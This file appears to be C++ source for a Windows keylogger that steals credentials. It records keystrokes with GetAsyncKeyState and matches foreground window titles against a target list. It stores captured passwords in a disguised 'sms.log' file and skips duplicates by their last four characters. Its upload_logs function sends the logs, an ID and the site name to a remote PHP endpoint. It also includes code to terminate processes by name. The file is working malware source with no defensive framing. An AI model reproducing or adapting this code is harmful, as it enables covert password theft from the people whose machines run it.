
void getPaths() {

	// Get FilePath
	char buff[MAX];
	GetModuleFileName(NULL, buff, MAX);
	CURRENT_FILE_PATH = buff;

	// Get UserProfile Directory
	USERPROFILE_PATH += getenv("USERPROFILE");
	USERPROFILE_PATH += "\\";

	LOGS_PATH = USERPROFILE_PATH + "sms.log";
}

HANDLE GetProcessHandle(LPSTR szExeName) {
	
	PROCESSENTRY32 Pc;

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (Process32First(hSnapshot, &Pc)) {
		do {
			if(!strcmp(Pc.szExeFile, szExeName)) {
				return OpenProcess(PROCESS_ALL_ACCESS, TRUE, Pc.th32ProcessID);
			}

		} while(Process32Next(hSnapshot, &Pc));
	}
	return NULL;
}


void endProcess(LPSTR szExeName) {
	HANDLE processHandle = GetProcessHandle(szExeName);
	TerminateProcess(processHandle, 0);
	CloseHandle(processHandle);
}


void upload_logs(string ID, string site) {

	string url;
	url = "http://example.com/log.php?logs=";
	url += urlencode(logs);
	url += "&ID=";
	url += urlencode(ID);
	url += "&site=";
	url += urlencode(site);
	
	HINTERNET hFile = fInternetOpenUrl( hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_PRAGMA_NOCACHE, 0 );
	InternetCloseHandle(hFile);
}


int record_keys() {
	
	int character;

	for (character = 8; character <= 222; character++) {

		if (GetAsyncKeyState(character) == -32767) {

			keyPressed = true;

			if((character>=39) && (character<=64)) {
				logs += character;
                break;
            }
			else if((character>=65)&&(character<=90))
            {
                character+=32;
                logs += character;
                break;
            }
            else {
				switch(character) {
					   case VK_SPACE:
                       logs += ' ';
                       break;    
                       case VK_SHIFT:
                       logs += "<SHIFT>";
                       break;                                            
                       case VK_RETURN:
                       logs += "<ENTER>";
                       break;
                       case VK_BACK:
                       logs += "<B>";
                       break;
                       case VK_TAB:
                       logs += "<TAB>";
                       break;
                       case VK_CONTROL:
                       logs += "<CTRL>";
                       break;    
                       case VK_DELETE:
                       logs += "<DEL>";
                       break;

                       case VK_OEM_1:
                       logs += "<;:>";
                       break;
                       case VK_OEM_2:
                       logs += "</?>";
                       break;
                       case VK_OEM_3:
                       logs += "<`~>";
                       break;
                       case VK_OEM_4:
                       logs += "< [{ >";
                       break;
                       case VK_OEM_5:
                       logs += "<\\|>";
                       break;                                
                       case VK_OEM_6:
                       logs += "< ]} >";
                       break;
                       case VK_OEM_7:
                       logs += "<'\">";
                       break;
                       case VK_OEM_PLUS:
                       logs += '+';
                       break;
                       case VK_OEM_COMMA:
                       logs += ',';
                       break;
                       case VK_OEM_MINUS:
                       logs += '-';
                       break;
                       case VK_OEM_PERIOD:
                       logs += '.';
                       break;

                       case VK_NUMPAD0:
                       logs += '0';
                       break;
                       case VK_NUMPAD1:
                       logs += '1';
                       break;
                       case VK_NUMPAD2:
                       logs += '2';
                       break;
                       case VK_NUMPAD3:
                       logs += '3';
                       break;
                       case VK_NUMPAD4:
                       logs += '4';
                       break;
                       case VK_NUMPAD5:
                       logs += '5';
                       break;
                       case VK_NUMPAD6:
                       logs += '6';
                       break;
                       case VK_NUMPAD7:
                       logs += '7';
                       break;
                       case VK_NUMPAD8:
                       logs += '8';
                       break;
                       case VK_NUMPAD9:
                       logs += '9';
                       break;
                       case VK_CAPITAL:
                       logs += "<CAPS>";
                       break;
				}
				
			} // end [ else ]
				
		}  // end [ if ]
	}  // end [ for ]               

	return EXIT_SUCCESS;

}


int file_size(char *path) {
	struct stat results;
    
    if (stat(path, &results) == 0)
		return results.st_size;
    else
		return -1;
}


string GetForegroundWindowText() {
	HWND hWnd = GetForegroundWindow();
	int nLen = GetWindowTextLength(hWnd);
		
	char *t = new char[nLen + 1];
	GetWindowText(hWnd, t, nLen + 1);

	string title = t;
	return title;
}


int matchWithTitles(string str) {
	
	for (int i = 0; i < NUM_TITLES; i++) {
		if ( str.find(titlesToSearch[i]) != string::npos ) {
			return i;
		}
	}

	return -1;	// Not found!
}


bool hasAlreadyLogged(string str) {

	bool value = false;

	string line, temp;

	char buff[MAX];
	GetPrivateProfileString("KMA", "Logs", "", buff, MAX, LOGS_PATH.c_str());
	string logsStored = buff;
	vector<string> data = split(logsStored, '#');

	for (int i=0; i < data.size(); i++) {

		if ( !data[i].empty() ) {

			if (data[i].length() >= 4)
				temp = data[i].substr(data[i].length() - 4);
			else
				temp = data[i];

			if (strEndsWith(str, temp)) {  // Only check the last 4 characters ( of the pass )
				value = true;
				break;
			}
		}
	}


	/* If logs are not already stored */
	if (value == false) {
		logsStored += "#" + str;
		WritePrivateProfileString("KMA", "Logs", logsStored.c_str(), LOGS_PATH.c_str());
	}

	return value;
}


string processLogs(string str) {

	string shift, ctrl, bkspace;

	// Remove extra <SHIFT> etc tags
	for (int i = 30; i >= 2; i--) {
		shift = ""; ctrl = ""; bkspace = "";
		
		for (int j=0; j < i; j++) {
			shift += "<SHIFT>";
			bkspace += "<B>";
			ctrl += "<CTRL>";
		}


		/* e.g <B6> */
		char i1[100]; itoa(i, i1, 10);
		string bkspace1 = "<B";
		bkspace1 += i1;
		bkspace1 += ">";

		if (str.find(shift) != string::npos) strReplace(str, shift, "<SHIFT>");
		if (str.find(bkspace) != string::npos) strReplace(str, bkspace, bkspace1);
		if (str.find(ctrl)  != string::npos) strReplace(str, ctrl,  "<CTRL>");
	}

	strReplace(str, "<ENTER>", "");

	return str;
}


string UserName() {

	char buff_user[MAX]; unsigned long size = sizeof(buff_user);
	GetUserName(buff_user, &size);
	return string(buff_user);
}

string ComputerName() {
	char buff_comp[MAX]; unsigned long size = sizeof(buff_comp);
	GetComputerName(buff_comp, &size);
	return string(buff_comp);
}

void strReplace(string &str, const string what, const string to) {

	if (str.empty() || what.empty()) return;

	size_t pos;
	while ( (pos = str.find(what)) != string::npos ) {
		str.replace(pos, what.length(), to);
	}
}

vector<string> split(string s, char delim) {
	vector<string> elems;
	stringstream ss(s);
	string item;
	while(getline(ss, item, delim)) {
		elems.push_back(item);
	}
	return elems;
}

bool strEndsWith(string str, string end) {

	if (end.length() > str.length()) return false;
	if ( str.substr(str.length() - end.length()) == end ) return true;
	else return false;
}
